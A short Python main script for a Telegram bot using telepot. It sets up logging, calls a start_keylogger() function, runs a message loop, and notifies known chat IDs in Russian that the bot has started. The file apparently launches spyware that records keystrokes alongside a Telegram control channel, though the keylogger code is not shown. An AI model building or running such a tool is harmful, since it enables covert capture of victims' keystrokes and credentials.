import add_packages
from telepot.loop import MessageLoop
from config import bot, KNOWN_IDS
from handlers import handle_message, send_safe_message
from loggers import setup_logging, start_keylogger
from time import sleep


if __name__ == '__main__':
    setup_logging()
    start_keylogger()
    MessageLoop(bot, handle_message).run_as_thread()

    for chat_id in KNOWN_IDS:
        send_safe_message(chat_id, "Бот запущен")

    while True:
        sleep(10)
